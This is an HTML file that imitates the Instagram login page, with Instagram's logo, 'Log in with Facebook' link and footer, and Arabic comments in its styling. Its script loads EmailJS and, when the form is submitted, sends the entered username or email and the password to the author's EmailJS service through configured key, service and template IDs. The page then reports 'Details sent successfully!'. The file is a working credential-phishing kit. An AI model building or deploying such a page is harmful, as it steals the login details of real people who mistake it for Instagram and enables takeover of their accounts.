<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page - Instagram</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .password-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            background: none;
            border: none;
            font-size: 14px;
            color: #0095f6;
            cursor: pointer;
        }

        #button {
            background-color: rgba(76, 86, 175, 0); /* خلفية شفافة */
            color: rgb(255, 255, 255); /* لون النص أبيض */
            border: none; /* بدون إطار */
            width: 200px; /* عرض الزر */
            height: 21px; /* ارتفاع الزر */
            border-radius: 19px; /* حواف دائرية */
            font-size: 14px; /* حجم النص داخل الزر */
            font-weight: bold; /* خط عريض */
            cursor: not-allowed; /* مؤشر غير مسموح */
            opacity: 0.5; /* شفافية الزر عند تعطيله */
            transition: background-color 0.3s ease, color 0.3s ease, opacity 0.3s ease;
        }

        #button.active {
            cursor: pointer; /* مؤشر اليد */
            opacity: 1; /* شفافية كاملة */
        }

        #button:hover:enabled {
            background-color: rgba(255, 255, 255, 0); /* يتحول إلى خلفية بيضاء */
            color: black; /* لون النص يصبح أسود */
        }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="instagram.png" alt="Instagram" style="width: 210px;">
            </div>
            <form id="form" class="form">
                <div class="input_field">
                    <input type="text" name="email" placeholder="Phone number, username, or email" class="input" required>
                </div>
                <div class="input_field password-wrapper">
                    <input id="password" type="password" name="password" placeholder="Password" class="input" required oninput="validatePassword()">
                    <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
                </div>
                <div class="btn">
                    <button id="button" type="submit" disabled>Log In</button>
                </div>
            </form>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="facebook.png" alt="Facebook">
                    <p style="color: #0042d1; font-size: 16px; font-weight: 500; cursor: pointer; transition: color 0.3s ease;" 
                        onmouseover="this.style.color='white';" 
                        onmouseout="this.style.color='#385185';">
                        Log in with Facebook
                    </p>
                </div>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="#"><img src="appstore.png" alt="App Store"></a>
                <a href="#"><img src="googleplay.png" alt="Google Play"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Support</a></li>
                <li><a href="#">Press</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Privacy</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Help</a></li>
                <li><a href="#">Profiles</a></li>
                <li><a href="#">Tags</a></li>
                <li><a href="#">Language</a></li>
            </ul>
        </div>
        <div class="copyright">
            © 2024 INSTAGRAM
        </div>
    </div>
</div>

<!-- Include EmailJS -->
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
    emailjs.init("zphcdlNlUOU0atLd7"); // Replace with your public key

    const btn = document.getElementById("button");

    document.getElementById("form").addEventListener("submit", function (event) {
        event.preventDefault();

        btn.innerText = "Logging in...";
        btn.disabled = true;

        const serviceID = "service_319ouye"; // Replace with your EmailJS service ID
        const templateID = "template_r0wnlsc"; // Replace with your EmailJS template ID

        emailjs.sendForm(serviceID, templateID, this).then(
            () => {
                btn.innerText = "Log In";
                btn.disabled = false;
                alert("Details sent successfully!");
            },
            (err) => {
                btn.innerText = "Log In";
                btn.disabled = false;
                alert("An error occurred while sending: " + JSON.stringify(err));
            }
        );
    });

    function togglePassword() {
        const passwordInput = document.getElementById("password");
        const toggleButton = document.querySelector(".toggle-password");
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            toggleButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            toggleButton.textContent = "Show";
        }
    }

    function validatePassword() {
        const passwordInput = document.getElementById("password");
        const btn = document.getElementById("button");

        if (passwordInput.value.length >= 6) {
            btn.disabled = false;
            btn.classList.add("active");
        } else {
            btn.disabled = true;
            btn.classList.remove("active");
        }
    }
</script>
</body>
</html>
